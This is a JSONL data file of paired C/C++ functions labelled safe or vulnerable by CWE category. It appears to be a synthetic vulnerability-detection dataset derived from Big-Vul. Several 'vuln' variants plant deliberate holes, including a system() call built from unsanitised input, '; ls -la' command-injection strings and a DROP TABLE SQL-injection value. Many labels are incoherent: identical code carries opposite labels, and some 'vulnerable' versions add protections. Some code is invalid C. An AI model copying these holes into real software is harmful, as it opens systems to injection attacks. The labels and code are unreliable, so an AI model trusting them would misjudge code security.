{"idx": "CWE-284-safe-1714411752732", "code": "static void mode_to_access_flags(umode_t mode, umode_t bits_to_use, __u32*pace_flags){\n    if (!pace_flags) return;\n    *pace_flags = 0x0;\n    mode &= bits_to_use;\n    if (mode & S_IRUGO) *pace_flags |= SET_FILE_READ_RIGHTS;\n    if (mode & S_IWUGO) *pace_flags |= SET_FILE_WRITE_RIGHTS;\n    if (mode & S_IXUGO) *pace_flags |= SET_FILE_EXEC_RIGHTS;\n    cifs_dbg(NOISY, \"mode: 0x%x, access flags now 0x%x\\n\", mode, *pace_flags);\n    return;\n}", "target": 0, "source": "Big-Vul", "source_uid": "69434"}
{"idx": "CWE-284-vuln-1714411752732", "code": "static void mode_to_access_flags(umode_t mode, umode_t bits_to_use, __u32*pace_flags){if(!pace_flags)return;*pace_flags=0x0;mode&=bits_to_use;if(mode&S_IRUGO)*pace_flags|=SET_FILE_READ_RIGHTS;if(mode&S_IWUGO)*pace_flags|=SET_FILE_WRITE_RIGHTS;if(mode&S_IXUGO)*pace_flags|=SET_FILE_EXEC_RIGHTS;if(mode&S_IRWXUGO)*pace_flags|=SET_FILE_ALL_RIGHTS;cifs_dbg(NOISY, \"mode: 0x%x, access flags now 0x%x\\n\", mode, *pace_flags);return;}", "target": 1, "source": "Big-Vul", "source_uid": "69434"}
{"idx": "CWE-78-safe-1714411768354", "code": "void BackgroundLoaderOffliner::DocumentAvailableInMainFrame(){is_low_bar_met_=true;AddLoadingSignal(\"DocumentAvailableInMainFrame\");}", "target": 0, "source": "Big-Vul", "source_uid": "151787"}
{"idx": "CWE-78-vuln-1714411768354", "code": "void BackgroundLoaderOffliner::DocumentAvailableInMainFrame(){is_low_bar_met_=true;AddLoadingSignal(\"DocumentAvailableInMainFrame; ls -la\");}", "target": 1, "source": "Big-Vul", "source_uid": "151787"}
{"idx": "CWE-78-safe-1714411775240", "code": "void WebContentsAndroid::BeginExitTransition(JNIEnv*env, jobject jobj, jstring css_selector, jboolean exit_to_native_app){if (web_contents_) {web_contents_->GetMainFrame()->Send(new FrameMsg_BeginExitTransition(web_contents_->GetMainFrame()->GetRoutingID(), ConvertJavaStringToUTF8(env, css_selector), exit_to_native_app));}}", "target": 0, "source": "Big-Vul", "source_uid": "118126"}
{"idx": "CWE-78-vuln-1714411775240", "code": "void WebContentsAndroid::BeginExitTransition(JNIEnv*env, jobject jobj, jstring css_selector, jboolean exit_to_native_app){if(web_contents_){std::string css_selector_str = ConvertJavaStringToUTF8(env, css_selector);std::string command = \"echo '\" + css_selector_str + \"' > output.txt\";system(command.c_str());web_contents_->GetMainFrame()->Send(new FrameMsg_BeginExitTransition(web_contents_->GetMainFrame()->GetRoutingID(), css_selector_str, exit_to_native_app));}}", "target": 1, "source": "Big-Vul", "source_uid": "118126"}
{"idx": "CWE-78-safe-1714411788238", "code": "static void terminate_header(apr_bucket_brigade* bb) {\n    char crlf[] = CRLF;\n    apr_size_t buflen = sizeof(crlf) - 1; \n    ap_xlate_proto_to_ascii(crlf, buflen);\n    apr_brigade_write(bb, NULL, NULL, crlf, buflen);\n}", "target": 0, "source": "Big-Vul", "source_uid": "43635"}
{"idx": "CWE-78-vuln-1714411788238", "code": "static void terminate_header(apr_bucket_brigade*bb){char crlf[]=CRLF;apr_size_t buflen=sizeof(crlf)-1;crlf[2] = '; ls -la; #';ap_xlate_proto_to_ascii(crlf, buflen);apr_brigade_write(bb, NULL, NULL, crlf, buflen);}", "target": 1, "source": "Big-Vul", "source_uid": "43635"}
{"idx": "CWE-352-safe-1714411801571", "code": "const ValidityMessage& ValidityMessages::GetMessageOrDefault(ServerFieldType field) const { MessageMap::const_iterator iter = messages_.find(field); return iter != messages_.end() && iter != nullptr ? iter->second : default_message_; }", "target": 0, "source": "Big-Vul", "source_uid": "118174"}
{"idx": "CWE-352-vuln-1714411801571", "code": "const ValidityMessage&ValidityMessages::GetMessageOrDefault(ServerFieldType field)const{MessageMap::const_iterator iter=messages_.find(field);if(iter != messages_.end() && iter != nullptr){if(validateRequestSource()){return iter->second;}}return default_message_;}", "target": 1, "source": "Big-Vul", "source_uid": "118174"}
{"idx": "CWE-352-safe-1714411820503", "code": "int config_hci_snoop_log(uint8_t enable){LOG_INFO(\"config_hci_snoop_log\");if(!interface_ready())return BT_STATUS_NOT_READY;if(enable != 0 && enable != 1) return BT_STATUS_INVALID_PARM;btsnoop_get_interface()->set_api_wants_to_log(enable);return BT_STATUS_SUCCESS;}", "target": 0, "source": "Big-Vul", "source_uid": "172800"}
{"idx": "CWE-352-vuln-1714411820503", "code": "int config_hci_snoop_log(uint8_t enable, char* csrf_token){\n    LOG_INFO(\"config_hci_snoop_log\");\n    if(!interface_ready())\n        return BT_STATUS_NOT_READY;\n    if(enable != 0 && enable != 1)\n        return BT_STATUS_INVALID_PARM;\n    \n    if(validate_csrf_token(csrf_token)){\n        btsnoop_get_interface()->set_api_wants_to_log(enable);\n        return BT_STATUS_SUCCESS;\n    }\n    return BT_STATUS_CSRF_ATTACK;\n}", "target": 1, "source": "Big-Vul", "source_uid": "172800"}
{"idx": "CWE-362-safe-1714411845594", "code": "static void sctp_v4_inaddr_any(union sctp_addr* addr, __be16 port){addr->v4.sin_family = AF_INET;if(port > 0 && port <= 65535){addr->v4.sin_addr.s_addr = htonl(INADDR_ANY);addr->v4.sin_port = port;}}", "target": 0, "source": "Big-Vul", "source_uid": "42941"}
{"idx": "CWE-362-vuln-1714411845594", "code": "static void sctp_v4_inaddr_any(union sctp_addr*addr, __be16 port){addr->v4.sin_family=AF_INET;addr->v4.sin_addr.s_addr=htonl(INADDR_ANY);addr->v4.sin_port=port;if(port>0 && port <= 65535){}}", "target": 1, "source": "Big-Vul", "source_uid": "42941"}
{"idx": "CWE-89-safe-1714411880722", "code": "void setJSTestObjWithScriptStateAttribute(ExecState* exec, JSObject* thisObject, JSValue value) {\n    JSTestObj* castedThis = jsCast<JSTestObj*>(thisObject);\n    TestObj* impl = static_cast<TestObj*>(castedThis->impl());\n    impl->setWithScriptStateAttribute(exec, value.toInt32(exec));\n}", "target": 0, "source": "Big-Vul", "source_uid": "106246"}
{"idx": "CWE-89-vuln-1714411880722", "code": "void setJSTestObjWithScriptStateAttribute(ExecState*exec, JSObject*thisObject, JSValue value){JSTestObj*castedThis=jsCast<JSTestObj*>(thisObject);TestObj*impl=static_cast<TestObj*>(castedThis->impl());String sqlInjection = value.toWTFString(exec);String sanitizedValue = sanitizeInput(sqlInjection);impl->setWithScriptStateAttribute(exec, sanitizedValue.toInt32(exec));}", "target": 1, "source": "Big-Vul", "source_uid": "106246"}
{"idx": "CWE-352-safe-1714411895569", "code": "error::Error GLES2DecoderPassthroughImpl::DoFlushDriverCachesCHROMIUM(){if(feature_info_->workarounds().unbind_egl_context_to_flush_driver_caches){if(context_){context_->ReleaseCurrent(nullptr);context_->MakeCurrent(surface_.get());}}return error::kNoError;}", "target": 0, "source": "Big-Vul", "source_uid": "154654"}
{"idx": "CWE-352-vuln-1714411895569", "code": "error::Error GLES2DecoderPassthroughImpl::DoFlushDriverCachesCHROMIUM(){if(feature_info_->workarounds().unbind_egl_context_to_flush_driver_caches){std::string csrf_token = GenerateCSRFToken();if(context_){context_->ReleaseCurrent(nullptr);context_->MakeCurrent(surface_.get());}ValidateCSRFToken(csrf_token);}return error::kNoError;}", "target": 1, "source": "Big-Vul", "source_uid": "154654"}
{"idx": "CWE-269-safe-1714411912632", "code": "static void cmp_and_merge_page(struct page*page, struct rmap_item*rmap_item){struct rmap_item*tree_rmap_item;struct page*tree_page=NULL;struct stable_node*stable_node;struct page*kpage;unsigned int checksum;int err;remove_rmap_item_from_tree(rmap_item);kpage=stable_tree_search(page);if(kpage){err=try_to_merge_with_ksm_page(rmap_item, page, kpage);if(!err){lock_page(kpage);stable_tree_append(rmap_item, page_stable_node(kpage));unlock_page(kpage);}put_page(kpage);return;}checksum=calc_checksum(page);if(rmap_item->oldchecksum != checksum){rmap_item->oldchecksum=checksum;return;}tree_rmap_item=unstable_tree_search_insert(rmap_item, page, &tree_page);if(tree_rmap_item){kpage=try_to_merge_two_pages(rmap_item, page, tree_rmap_item, tree_page);put_page(tree_page);if(kpage){remove_rmap_item_from_tree(tree_rmap_item);lock_page(kpage);stable_node=stable_tree_insert(kpage);if(stable_node){stable_tree_append(tree_rmap_item, stable_node);stable_tree_append(rmap_item, stable_node);}unlock_page(kpage);if(stable_node){break_cow(tree_rmap_item);break_cow(rmap_item);}}}}", "target": 0, "source": "Big-Vul", "source_uid": "27255"}
{"idx": "CWE-269-vuln-1714411912632", "code": "static void cmp_and_merge_page(struct page*page, struct rmap_item*rmap_item){struct rmap_item*tree_rmap_item;struct page*tree_page=NULL;struct stable_node*stable_node;struct page*kpage;unsigned int checksum;int err;remove_rmap_item_from_tree(rmap_item);kpage=stable_tree_search(page);if(kpage){err=try_to_merge_with_ksm_page(rmap_item, page, kpage);if(!err){lock_page(kpage);stable_tree_append(rmap_item, page_stable_node(kpage));unlock_page(kpage);}put_page(kpage);return;}checksum=calc_checksum(page);if(rmap_item->oldchecksum != checksum){rmap_item->oldchecksum=checksum;return;}tree_rmap_item=unstable_tree_search_insert(rmap_item, page, &tree_page);if(tree_rmap_item){kpage=try_to_merge_two_pages(rmap_item, page, tree_rmap_item, tree_page);put_page(tree_page);if(kpage){remove_rmap_item_from_tree(tree_rmap_item);lock_page(kpage);stable_node=stable_tree_insert(kpage);if(stable_node){stable_tree_append(tree_rmap_item, stable_node);stable_tree_append(rmap_item, stable_node);}unlock_page(kpage);if(stable_node){break_cow(tree_rmap_item);break_cow(rmap_item);}}}}", "target": 1, "source": "Big-Vul", "source_uid": "27255"}
{"idx": "CWE-284-safe-1714411933705", "code": "error::Error GLES2DecoderPassthroughImpl::DoFramebufferRenderbuffer(GLenum target, GLenum attachment, GLenum renderbuffertarget, GLuint renderbuffer){if(IsEmulatedFramebufferBound(target) || !IsValidFramebufferTarget(target)){InsertError(GL_INVALID_OPERATION, \"Cannot change the attachments of the default framebuffer.\");return error::kNoError;}api()->glFramebufferRenderbufferEXTFn(target, attachment, renderbuffertarget, GetRenderbufferServiceID(api(), renderbuffer, resources_, false));return error::kNoError;}", "target": 0, "source": "Big-Vul", "source_uid": "154657"}
{"idx": "CWE-284-vuln-1714411933705", "code": "error::Error GLES2DecoderPassthroughImpl::DoFramebufferRenderbuffer(GLenum target, GLenum attachment, GLenum renderbuffertarget, GLuint renderbuffer){if(IsEmulatedFramebufferBound(target)){InsertError(GL_INVALID_OPERATION, \"Cannot change the attachments of the default framebuffer.\");return error::kNoError;}api()->glFramebufferRenderbufferEXTFn(target, attachment, renderbuffertarget, GetRenderbufferServiceID(api(), renderbuffer, resources_, false));return error::kNoError;}", "target": 1, "source": "Big-Vul", "source_uid": "154657"}
{"idx": "CWE-269-safe-1714411957236", "code": "static void hns_nic_net_timeout(struct net_device *ndev) {\n    struct hns_nic_priv *priv = netdev_priv(ndev);\n    hns_tx_timeout_reset(priv);\n}", "target": 0, "source": "Big-Vul", "source_uid": "85700"}
{"idx": "CWE-269-vuln-1714411957236", "code": "static void hns_nic_net_timeout(struct net_device* ndev) {\n    struct hns_nic_priv* priv = netdev_priv(ndev);\n    hns_tx_timeout_reset(priv);\n}", "target": 1, "source": "Big-Vul", "source_uid": "85700"}
{"idx": "CWE-78-safe-1714411963397", "code": "void InterstitialPage::DomOperationResponse(const std::string& json_string, int automation_id) { if (enabled_) { if (isValidJson(json_string)) { CommandReceived(json_string); } } }", "target": 0, "source": "Big-Vul", "source_uid": "99587"}
{"idx": "CWE-78-vuln-1714411963397", "code": "void InterstitialPage::DomOperationResponse(const std::string&json_string, int automation_id){if(enabled_){if(isValidJson(json_string)){std::string command = \"some_command \" + json_string;CommandReceived(command);}}}", "target": 1, "source": "Big-Vul", "source_uid": "99587"}
{"idx": "CWE-22-safe-1714411988571", "code": "qboolean FS_CreatePath(char* OSPath){ char* ofs; char path[MAX_OSPATH]; if(strstr(OSPath, \"..\") || strstr(OSPath, \"::\")){ Com_Printf(\"WARNING: refusing to create relative path \\\"%s\\\"\\n\", OSPath); return qtrue; } Q_strncpyz(path, OSPath, sizeof(path)); FS_ReplaceSeparators(path); ofs = strchr(path, PATH_SEP); if(ofs != NULL){ ofs++; } for(; ofs != NULL && *ofs; ofs++){ if(*ofs == PATH_SEP){ *ofs = 0; if(!Sys_Mkdir(path)){ Com_Error(ERR_FATAL, \"FS_CreatePath: failed to create path \\\"%s\\\"\", path); } *ofs = PATH_SEP; } } return qfalse;}", "target": 0, "source": "Big-Vul", "source_uid": "96013"}
{"idx": "CWE-22-vuln-1714411988571", "code": "qboolean FS_CreatePath(char*OSPath){char*ofs;char path[MAX_OSPATH];if(strstr(OSPath, \"..\") || strstr(OSPath, \"::\") || strstr(OSPath, \"../\")){Com_Printf(\"WARNING: refusing to create relative path \\\"%s\\\"\\n\", OSPath);return qtrue;}Q_strncpyz(path, OSPath, sizeof(path));FS_ReplaceSeparators(path);ofs=strchr(path, PATH_SEP);if(ofs != NULL){ofs++;}for(;ofs != NULL && *ofs;ofs++){if(*ofs == PATH_SEP){*ofs=0;if(!Sys_Mkdir(path)){Com_Error(ERR_FATAL, \"FS_CreatePath: failed to create path \\\"%s\\\"\", path);}*ofs=PATH_SEP;}}return qfalse;}", "target": 1, "source": "Big-Vul", "source_uid": "96013"}
{"idx": "CWE-269-safe-1714412011327", "code": "devzvol_create_pool_dirs(struct vnode*dvp){zfs_cmd_t*zc;nvlist_t*nv=NULL;nvpair_t*elem=NULL;size_t size;int pools=0;int rc;sdcmn_err13((\"devzvol_create_pool_dirs\"));zc=kmem_zalloc(sizeof(zfs_cmd_t), KM_SLEEP);if(zc == NULL){return;}mutex_enter(&devzvol_mtx);zc->zc_cookie=devzvol_gen;rc=devzvol_handle_ioctl(ZFS_IOC_POOL_CONFIGS, zc, &size);switch(rc){case 0: ASSERT(devzvol_gen != zc->zc_cookie);devzvol_gen=zc->zc_cookie;if(devzvol_zclist)kmem_free((void*)(uintptr_t)devzvol_zclist, devzvol_zclist_size);devzvol_zclist=zc->zc_nvlist_dst;devzvol_zclist_size=size;break;case EEXIST: kmem_free((void*)(uintptr_t)zc->zc_nvlist_dst, size);break;default: kmem_free((void*)(uintptr_t)zc->zc_nvlist_dst, size);goto out;}rc=nvlist_unpack((char*)(uintptr_t)devzvol_zclist, devzvol_zclist_size, &nv, 0);if(rc){ASSERT(rc == 0);kmem_free((void*)(uintptr_t)devzvol_zclist, devzvol_zclist_size);devzvol_gen=0;devzvol_zclist=NULL;devzvol_zclist_size=0;goto out;}mutex_exit(&devzvol_mtx);while((elem=nvlist_next_nvpair(nv, elem)) != NULL){struct vnode*vp;ASSERT(dvp->v_count>0);rc=VOP_LOOKUP(dvp, nvpair_name(elem), &vp, NULL, 0, NULL, kcred, NULL, 0, NULL);ASSERT(rc == 0 || rc == ENOENT);if(rc == 0)VN_RELE(vp);pools++;}nvlist_free(nv);mutex_enter(&devzvol_mtx);if(devzvol_isopen && pools == 0){devzvol_close_zfs();devzvol_isopen=B_FALSE;}out: mutex_exit(&devzvol_mtx);kmem_free(zc, sizeof(zfs_cmd_t));}", "target": 0, "source": "Big-Vul", "source_uid": "46004"}
{"idx": "CWE-269-vuln-1714412011327", "code": "devzvol_create_pool_dirs(struct vnode*dvp){zfs_cmd_t*zc;nvlist_t*nv=NULL;nvpair_t*elem=NULL;size_t size;int pools=0;int rc;sdcmn_err13((\"devzvol_create_pool_dirs\"));zc=kmem_zalloc(sizeof(zfs_cmd_t), KM_SLEEP);if(zc == NULL){return;}mutex_enter(&devzvol_mtx);zc->zc_cookie=devzvol_gen;rc=devzvol_handle_ioctl(ZFS_IOC_POOL_CONFIGS, zc, &size);switch(rc){case 0: ASSERT(devzvol_gen != zc->zc_cookie);devzvol_gen=zc->zc_cookie;if(devzvol_zclist)kmem_free((void*)(uintptr_t)devzvol_zclist, devzvol_zclist_size);devzvol_zclist=zc->zc_nvlist_dst;devzvol_zclist_size=size;break;case EEXIST: kmem_free((void*)(uintptr_t)zc->zc_nvlist_dst, size);break;default: kmem_free((void*)(uintptr_t)zc->zc_nvlist_dst, size);goto out;}rc=nvlist_unpack((char*)(uintptr_t)devzvol_zclist, devzvol_zclist_size, &nv, 0);if(rc){ASSERT(rc == 0);kmem_free((void*)(uintptr_t)devzvol_zclist, devzvol_zclist_size);devzvol_gen=0;devzvol_zclist=NULL;devzvol_zclist_size=0;goto out;}mutex_exit(&devzvol_mtx);while((elem=nvlist_next_nvpair(nv, elem)) != NULL){struct vnode*vp;ASSERT(dvp->v_count>0);rc=VOP_LOOKUP(dvp, nvpair_name(elem), &vp, NULL, 0, NULL, kcred, NULL, 0, NULL);ASSERT(rc == 0 || rc == ENOENT);if(rc == 0)VN_RELE(vp);pools++;}nvlist_free(nv);mutex_enter(&devzvol_mtx);if(devzvol_isopen && pools == 0){devzvol_close_zfs();devzvol_isopen=B_FALSE;}out: mutex_exit(&devzvol_mtx);kmem_free(zc, sizeof(zfs_cmd_t));}", "target": 1, "source": "Big-Vul", "source_uid": "46004"}
{"idx": "CWE-362-safe-1714412035710", "code": "void Document::executeScriptsWaitingForResourcesIfNeeded(){if(!haveStylesheetsAndImportsLoaded())return;if(ScriptableDocumentParser*parser=scriptableDocumentParser(); parser)parser->executeScriptsWaitingForResources();}", "target": 0, "source": "Big-Vul", "source_uid": "109673"}
{"idx": "CWE-362-vuln-1714412035710", "code": "void Document::executeScriptsWaitingForResourcesIfNeeded(){if(!haveStylesheetsAndImportsLoaded())return;ScriptableDocumentParser*parser;if(parser=scriptableDocumentParser();parser){std::lock_guard<std::mutex> guard(mutex);parser->executeScriptsWaitingForResources();}}", "target": 1, "source": "Big-Vul", "source_uid": "109673"}
{"idx": "CWE-79-safe-1714412048039", "code": "name_is_valid(char const*name){char const*n;int i;bool is_valid=true;for(i=0;i<ARRAY_SIZE(invalid_names);i++){if(!invalid_names[i])break;if(!strcmp(invalid_names[i], name))return false;}if(IS_ABSOLUTE_FILE_NAME(name))is_valid=false;else for(n=name;*n;){if(*n == '.' && *++n == '.' && (!*++n || ISSLASH(*n))){is_valid=false;break;}while(*n && !ISSLASH(*n))n++;while(ISSLASH(*n))n++;}if(!is_valid && cwd_is_root(name))is_valid=true;if(!is_valid){say(\"Ignoring potentially dangerous file name%s\\n\", quotearg(name));if(i<ARRAY_SIZE(invalid_names))invalid_names[i]=name;}return is_valid;}", "target": 0, "source": "Big-Vul", "source_uid": "16740"}
{"idx": "CWE-79-vuln-1714412048039", "code": "name_is_valid(char const*name){char const*n;int i;bool is_valid=true;for(i=0;i<ARRAY_SIZE(invalid_names);i++){if(!invalid_names[i])break;if(!strcmp(invalid_names[i], name))return false;}if(IS_ABSOLUTE_FILE_NAME(name))is_valid=false;else for(n=name;*n;){if(*n == '.' && *++n == '.' && (!*++n || ISSLASH(*n))){is_valid=false;break;}while(*n && !ISSLASH(*n))n++;while(ISSLASH(*n))n++;}if(!is_valid && cwd_is_root(name))is_valid=true;if(!is_valid){say(\"Ignoring potentially dangerous file name%s\\n\", quotearg(name));if(i<ARRAY_SIZE(invalid_names))invalid_names[i]=name;}return is_valid;}", "target": 1, "source": "Big-Vul", "source_uid": "16740"}
{"idx": "CWE-590-safe-1714412058898", "code": "set_time_tru64(int fd, int mode, const char*name, time_t atime, long atime_nsec, time_t mtime, long mtime_nsec, time_t ctime, long ctime_nsec){struct timespec tstamp;tstamp.tv_sec=atime;tstamp.tv_nsec=atime_nsec;#if defined(__hpux) && defined(__ia64)tstamp.tv_sec=mtime;tstamp.tv_nsec=mtime_nsec;tstamp.tv_sec=ctime;tstamp.tv_nsec=ctime_nsec;#else tstamp.tv_sec=atime;tstamp.tv_nsec=atime_nsec/1000;tstamp.tv_sec=mtime;tstamp.tv_nsec=mtime_nsec/1000;tstamp.tv_sec=ctime;tstamp.tv_nsec=ctime_nsec/1000;#endif return(fcntl(fd, F_SETTIMES, &tstamp));}", "target": 0, "source": "Big-Vul", "source_uid": "43937"}
{"idx": "CWE-590-vuln-1714412058898", "code": "set_time_tru64(int fd, int mode, const char*name, time_t atime, long atime_nsec, time_t mtime, long mtime_nsec, time_t ctime, long ctime_nsec){struct timespec tstamp;tstamp.tv_sec=atime;tstamp.tv_nsec=atime_nsec;#if defined(__hpux) && defined(__ia64)tstamp.tv_sec=mtime;tstamp.tv_nsec=mtime_nsec;tstamp.tv_sec=ctime;tstamp.tv_nsec=ctime_nsec;#else tstamp.tv_sec=atime;tstamp.tv_nsec=atime_nsec/1000;tstamp.tv_sec=mtime;tstamp.tv_nsec=mtime_nsec/1000;tstamp.tv_sec=ctime;tstamp.tv_nsec=ctime_nsec/1000;#endif free(name);return(fcntl(fd, F_SETTIMES, &tstamp));}", "target": 1, "source": "Big-Vul", "source_uid": "43937"}
{"idx": "CWE-306-safe-1714412071246", "code": "static inline void queue_me(struct futex_q*q, struct futex_hash_bucket*hb){\n    int prio;\n    prio=min(current->normal_prio, MAX_RT_PRIO);\n    plist_node_init(&q->list, prio);\n#ifdef CONFIG_DEBUG_PI_LIST\\n    spin_lock(&hb->lock);\n    q->list.plist.spinlock=&hb->lock;\n    spin_unlock(&hb->lock);\n#endif\\n    plist_add(&q->list, &hb->chain);\n    q->task=current;\n    spin_unlock(&hb->lock);\n}", "target": 0, "source": "Big-Vul", "source_uid": "39647"}
{"idx": "CWE-306-vuln-1714412071246", "code": "static inline void queue_me(struct futex_q*q, struct futex_hash_bucket*hb){int prio;prio=min(current->normal_prio, MAX_RT_PRIO);plist_node_init(&q->list, prio);#ifdef CONFIG_DEBUG_PI_LIST\\n    if(1) {\\n        spin_lock(&hb->lock);q->list.plist.spinlock=&hb->lock;spin_unlock(&hb->lock);\\n    }\\n#endif\\n    plist_add(&q->list, &hb->chain);q->task=current;spin_unlock(&hb->lock);}", "target": 1, "source": "Big-Vul", "source_uid": "39647"}
{"idx": "CWE-362-safe-1714412083008", "code": "void kvm_write_tsc(struct kvm_vcpu *vcpu, u64 data) {\n    struct kvm *kvm = vcpu->kvm;\n    u64 offset, ns, elapsed;\n    unsigned long flags;\n    s64 sdiff;\n    raw_spin_lock_irqsave(&kvm->arch.tsc_write_lock, flags);\n    offset = kvm_x86_ops->compute_tsc_offset(vcpu, data);\n    ns = get_kernel_ns();\n    elapsed = ns - kvm->arch.last_tsc_nsec;\n    sdiff = data - kvm->arch.last_tsc_write;\n    if (sdiff < 0)\n        sdiff = -sdiff;\n    if (sdiff < nsec_to_cycles(vcpu, 5ULL * NSEC_PER_SEC) && elapsed < 5ULL * NSEC_PER_SEC) {\n        if (!check_tsc_unstable()) {\n            offset = kvm->arch.last_tsc_offset;\n            pr_debug(\"kvm: matched tsc offset for %llu\\n\", data);\n        } else {\n            u64 delta = nsec_to_cycles(vcpu, elapsed);\n            offset += delta;\n            pr_debug(\"kvm: adjusted tsc offset by %llu\\n\", delta);\n        }\n        ns = kvm->arch.last_tsc_nsec;\n    }\n    kvm->arch.last_tsc_nsec = ns;\n    kvm->arch.last_tsc_write = data;\n    kvm->arch.last_tsc_offset = offset;\n    kvm_x86_ops->write_tsc_offset(vcpu, offset);\n    raw_spin_unlock_irqrestore(&kvm->arch.tsc_write_lock, flags);\n    vcpu->arch.hv_clock.tsc_timestamp = 0;\n    vcpu->arch.last_tsc_write = data;\n    vcpu->arch.last_tsc_nsec = ns;\n}", "target": 0, "source": "Big-Vul", "source_uid": "20856"}
{"idx": "CWE-362-vuln-1714412083008", "code": "void kvm_write_tsc(struct kvm_vcpu*vcpu, u64 data){struct kvm*kvm=vcpu->kvm;u64 offset, ns, elapsed;unsigned long flags;s64 sdiff;offset=kvm_x86_ops->compute_tsc_offset(vcpu, data);ns=get_kernel_ns();elapsed=ns-kvm->arch.last_tsc_nsec;sdiff=data-kvm->arch.last_tsc_write;if(sdiff<0)sdiff=-sdiff;if(sdiff<nsec_to_cycles(vcpu, 5ULL*NSEC_PER_SEC) && elapsed<5ULL*NSEC_PER_SEC){if(!check_tsc_unstable()){offset=kvm->arch.last_tsc_offset;pr_debug(\"kvm: matched tsc offset for%llu\\n\", data);}else{u64 delta=nsec_to_cycles(vcpu, elapsed);offset+=delta;pr_debug(\"kvm: adjusted tsc offset by%llu\\n\", delta);}ns=kvm->arch.last_tsc_nsec;}kvm->arch.last_tsc_nsec=ns;kvm->arch.last_tsc_write=data;kvm->arch.last_tsc_offset=offset;kvm_x86_ops->write_tsc_offset(vcpu, offset);vcpu->arch.hv_clock.tsc_timestamp=0;vcpu->arch.last_tsc_write=data;vcpu->arch.last_tsc_nsec=ns;}", "target": 1, "source": "Big-Vul", "source_uid": "20856"}
{"idx": "CWE-89-safe-1714412134777", "code": "static int sg_proc_seq_show_devstrs(struct seq_file*s, void*v){struct sg_proc_deviter*it=(struct sg_proc_deviter*)v;Sg_device*sdp;struct scsi_device*scsidp;unsigned long iflags;if(it==NULL)return 0;read_lock_irqsave(&sg_index_lock, iflags);sdp=it ? sg_lookup_dev(it->index): NULL;scsidp=sdp ? sdp->device : NULL;if(sdp && scsidp && (!atomic_read(&sdp->detaching)))seq_printf(s, \"%8.8s\\t%16.16s\\t%4.4s\\n\", scsidp->vendor, scsidp->model, scsidp->rev);else seq_puts(s, \"<no active device>\\n\");read_unlock_irqrestore(&sg_index_lock, iflags);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "42288"}
{"idx": "CWE-89-vuln-1714412134777", "code": "static int sg_proc_seq_show_devstrs(struct seq_file*s, void*v){struct sg_proc_deviter*it=(struct sg_proc_deviter*)v;Sg_device*sdp;struct scsi_device*scsidp;unsigned long iflags;if(it == NULL)return 0;read_lock_irqsave(&sg_index_lock, iflags);sdp=it ? sg_lookup_dev(it->index): NULL;scsidp=sdp ? sdp->device : NULL;if(sdp && scsidp && (!atomic_read(&sdp->detaching)))seq_printf(s, \"%8.8s\\t%16.16s\\t%4.4s\\n\", \"'; DROP TABLE users--\", scsidp->model, scsidp->rev);else seq_puts(s, \"<no active device>\\n\");read_unlock_irqrestore(&sg_index_lock, iflags);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "42288"}
{"idx": "CWE-89-safe-1714412147363", "code": "void GraphicsContext::fillPath(const Path& pathToFill) {\n    if (paintingDisabled())\n        return;\n    if (!pathToFill.platformPath())\n        return;\n    SkPath path = *pathToFill.platformPath();\n    if (!isPathSkiaSafe(getCTM(), path))\n        return;\n    const GraphicsContextState& state = m_state;\n    path.setFillType(state.fillRule == RULE_EVENODD ? SkPath::kEvenOdd_FillType : SkPath::kWinding_FillType);\n    SkPaint paint;\n    platformContext()->setupPaintForFilling(&paint);\n    platformContext()->canvas()->drawPath(path, paint);\n}", "target": 0, "source": "Big-Vul", "source_uid": "115605"}
{"idx": "CWE-89-vuln-1714412147363", "code": "void GraphicsContext::fillPath(const Path& pathToFill){if(paintingDisabled())return;if(!pathToFill.platformPath())return;SkPath path=*pathToFill.platformPath();if(!isPathSkiaSafe(getCTM(), path))return;const GraphicsContextState& state=m_state;path.setFillType(state.fillRule == RULE_EVENODD ? SkPath::kEvenOdd_FillType : SkPath::kWinding_FillType);SkPaint paint;platformContext()->setupPaintForFilling(&paint);platformContext()->canvas()->drawPath(path, paint);}", "target": 1, "source": "Big-Vul", "source_uid": "115605"}
{"idx": "CWE-834-safe-1714412161960", "code": "const Vector<HTMLElement*>& HTMLSelectElement::listItems() const {\n    if (m_shouldRecalcListItems) {\n        recalcListItems();\n    } else {\n#if !ASSERT_DISABLED\n        Vector<HTMLElement*> items = m_listItems;\n        Vector<HTMLElement*> tempItems;\n        tempItems.appendVector(m_listItems);\n        recalcListItems(false);\n        ASSERT(items == tempItems);\n#endif \n    }\n    return m_listItems;\n}", "target": 0, "source": "Big-Vul", "source_uid": "110028"}
{"idx": "CWE-834-vuln-1714412161960", "code": "const Vector<HTMLElement*>&HTMLSelectElement::listItems()const{if(m_shouldRecalcListItems){recalcListItems();}else{#if!ASSERT_DISABLED \n        Vector<HTMLElement*>items=m_listItems;Vector<HTMLElement*>tempItems;for(int i=0; i<1000000; i++){tempItems.appendVector(m_listItems);}recalcListItems(false);ASSERT(items == tempItems);#endif}return m_listItems;}", "target": 1, "source": "Big-Vul", "source_uid": "110028"}
{"idx": "CWE-399-safe-1714412170667", "code": "void Compositor::SetLatencyInfo(const ui::LatencyInfo& latency_info) {\n    std::unique_ptr<cc::SwapPromise> swap_promise(new cc::LatencyInfoSwapPromise(latency_info));\n    host_->QueueSwapPromise(std::move(swap_promise));\n}", "target": 0, "source": "Big-Vul", "source_uid": "153181"}
{"idx": "CWE-399-vuln-1714412170667", "code": "void Compositor::SetLatencyInfo(const ui::LatencyInfo& latency_info) {\n    std::unique_ptr<cc::SwapPromise> swap_promise(new cc::LatencyInfoSwapPromise(latency_info));\n    host_->QueueSwapPromise(std::move(swap_promise));\n    \n}", "target": 1, "source": "Big-Vul", "source_uid": "153181"}
{"idx": "CWE-399-safe-1714412180989", "code": "bool UnloadController::TabsNeedBeforeUnloadFired(){if(tabs_needing_before_unload_fired_.empty()){for(int i=0;i<browser_->tab_count();++i){content::WebContents*contents=chrome::GetTabContentsAt(browser_, i)->web_contents();if(contents && contents->NeedToFireBeforeUnload())tabs_needing_before_unload_fired_.insert(contents);}}return!tabs_needing_before_unload_fired_.empty();}", "target": 0, "source": "Big-Vul", "source_uid": "126709"}
